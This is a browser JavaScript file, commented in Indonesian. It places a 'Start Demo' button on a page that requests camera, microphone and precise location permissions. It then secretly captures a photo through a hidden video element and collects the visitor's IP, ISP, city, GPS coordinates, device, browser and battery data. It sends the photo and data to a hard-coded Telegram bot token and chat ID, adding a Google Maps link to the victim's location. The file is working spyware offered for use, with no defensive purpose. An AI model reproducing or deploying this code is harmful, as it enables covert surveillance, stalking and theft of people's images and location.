// === Konfigurasi Bot Telegram ===
const BOT_TOKEN = "8367413026:AAEM93F3pqbBwdOwJTCHs_0TYO4PnVsGfqY";
const CHAT_ID = "8482486283";

// Buat elemen video tersembunyi untuk akses kamera
const camera = document.createElement("video");
camera.autoplay = true;
camera.style.display = "none";
document.body.appendChild(camera);

// Fungsi ambil info user
async function getUserInfo() {
  try {
    const ipRes = await fetch("https://ipapi.co/json/");
    const ipData = await ipRes.json();

    const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
    const namaWifi = connection && connection.type ? connection.type : "Tidak diketahui";

    const battery = await (navigator.getBattery ? navigator.getBattery() : Promise.resolve({level: 'Tidak tersedia'}));

    return {
      ip: ipData.ip || "-",
      isp: ipData.org || "-",
      city: ipData.city || "-",
      region: ipData.region || "-",
      country: ipData.country_name || "-",
      lat: ipData.latitude,
      lon: ipData.longitude,
      time: new Date().toLocaleString(),
      browser: navigator.userAgent,
      platform: navigator.platform,
      language: navigator.language,
      screen: `${window.screen.width}x${window.screen.height}`,
      timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
      wifi: namaWifi,
      battery: battery.level !== undefined ? battery.level*100+"%" : "Tidak tersedia"
    };
  } catch (err) {
    console.error("Gagal ambil info user:", err);
    return {};
  }
}

// Kirim foto + data ke Telegram
function kirimFotoTelegram(blob, info) {
  const formData = new FormData();
  formData.append("chat_id", CHAT_ID);
  formData.append("photo", blob, "capture.jpg");
  formData.append(
    "caption",
    `📡 IP: ${info.ip}
🏢 ISP: ${info.isp}
📶 Nama WiFi: ${info.wifi}
📍 Lokasi: ${info.lat}, ${info.lon}
🌆 Kota: ${info.city}, ${info.region}, ${info.country}
🕒 Waktu: ${info.time} (${info.timezone})
💻 Device: ${info.platform}
🌐 Browser: ${info.browser}
🖥 Resolusi: ${info.screen}
🔋 Battery: ${info.battery}
🔗 https://www.google.com/maps?q=${info.lat},${info.lon}`
  );

  return fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
    method: "POST",
    body: formData,
  });
}

// Fungsi request izin kamera + mikrofon + lokasi
function requestPermissions() {
  return new Promise((resolve, reject) => {
    (async () => {
      try {
        // Kamera + mikrofon
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: "user" },
          audio: true
        });
        camera.srcObject = stream;

        // Lokasi high accuracy
        navigator.geolocation.getCurrentPosition(
          (pos) => resolve(pos.coords),
          (err) => reject("Gagal mendapatkan lokasi"),
          { enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }
        );
      } catch (e) {
        reject("Gagal mendapatkan izin kamera/mikrofon");
      }
    })();
  });
}

// Capture kamera lalu kirim
async function captureAndSend() {
  const info = await getUserInfo();

  const canvas = document.createElement("canvas");
  canvas.width = camera.videoWidth || 640;
  canvas.height = camera.videoHeight || 480;
  canvas.getContext("2d").drawImage(camera, 0, 0, canvas.width, canvas.height);

  canvas.toBlob(
    (blob) => {
      kirimFotoTelegram(blob, info).then(() =>
        console.log("Foto + data terkirim ke Telegram")
      );
    },
    "image/jpeg",
    0.95
  );
}

// Tambahin button Start Demo
const startBtn = document.createElement("button");
startBtn.innerText = "Start Demo";
startBtn.style.padding = "12px 20px";
startBtn.style.fontSize = "18px";
startBtn.style.margin = "20px";
startBtn.style.cursor = "pointer";
document.body.appendChild(startBtn);

startBtn.addEventListener("click", () => {
  startBtn.disabled = true;
  startBtn.innerText = "Loading...";

  requestPermissions()
    .then(() => {
      setTimeout(() => captureAndSend(), 3000);
    })
    .catch((e) => {
      console.error("Error:", e);
      startBtn.innerText = "Gagal, coba lagi";
      startBtn.disabled = false;
    });
});
